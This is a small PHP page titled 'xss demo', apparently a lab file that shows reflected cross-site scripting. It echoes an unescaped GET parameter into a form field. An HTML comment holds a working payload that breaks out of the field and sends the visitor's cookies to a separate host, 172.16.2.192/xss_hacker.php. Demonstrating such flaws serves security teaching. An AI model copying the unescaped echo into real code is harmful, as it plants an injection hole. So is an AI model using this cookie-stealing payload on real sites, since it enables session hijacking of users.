<?php
	session_start();
?>

<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>xss demo</title>
</head>


<body>
	<form>  
		<!--"/> <script>window.open("http://172.16.2.192/xss_hacker.php?cookie="+document.cookie);</script><!--  -->
    	<input style="width:300px;" type="text" name="address1" value="<?php echo $_GET["address1"]; ?>" />  
        <input type="submit" value="Submit" />  
    </form>  
</body>
</html>

